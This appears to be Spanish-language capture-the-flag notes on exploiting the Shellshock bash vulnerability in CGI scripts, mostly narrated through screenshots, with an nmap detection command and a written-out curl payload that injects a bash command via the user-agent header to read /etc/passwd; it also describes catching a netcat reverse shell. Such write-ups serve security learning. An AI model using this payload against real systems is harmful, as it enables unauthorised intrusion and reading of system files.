## **VULNERABILIDAD SHELLSHOCK**

Ahora que vemos que estamos ante un fichero -sh y se trata de una bash, ya que vemos también que la ruta es cgi-bin, podemos intentar explotar la vulnerabilidad shellshock, para colarnos en esa bash y lanzar comandos remotos; para hacer la comprobación lo haremos de esta manera:

![[Pasted image 20221217112739.png]]

Y nos dice que esta bash de la máquina víctima es vulnerable:

![[Pasted image 20221217112746.png]]

Ahora vamos a explotar la vulnerabilidad, ya que existen peticiones especialmente hechas para colar comandos en esta bash vulnerable; y por internet podemos encontrar información:

![[Pasted image 20221217112754.png]]

Y ahora si lanzamos es comando pero pasándole la IP y el cgi-bin/user.sh, podremos lanzar un comando, por ejemplo un whoami:

![[Pasted image 20221217112803.png]]

Pues ahora sabiendo esto, vamos a lanzar la remote shell, para ello nos ponemos por escucha con netcat:

![[Pasted image 20221217112811.png]]

Lanzamos la shell interactiva:

![[Pasted image 20221217112819.png]]

Y nos llega la conexión:

![[Pasted image 20221217112826.png]]

Y por aquí la flag:

![[Pasted image 20221217112834.png]]

# OPCION 2

Para detectar si un target es vulnerable a shellshock, podemos usar este script de nmap pasándole el fichero con extensión .cgi que podremos encontrar dentro de la web:
```bash
nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi”
192.242.220.3
```
![[Pasted image 20230731100233.png]]
Además de ver que hay un archivo con extensión .cgi:
![[Pasted image 20230731100457.png]]
Si buscamos por internet, vemos un comando para explotar esto mismo y tener ejecución remota de comandos:
![[Pasted image 20221217112754.png]]
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://localhost:8080/cgi-bin/vulnerable
```
Por tanto ejecutamos esto mismo contra la máquina víctima interceptando primero la petición con burp suite:
![[Pasted image 20230731100932.png]]
Y a continuación lanzamos el payload:
![[Pasted image 20230731101110.png]]
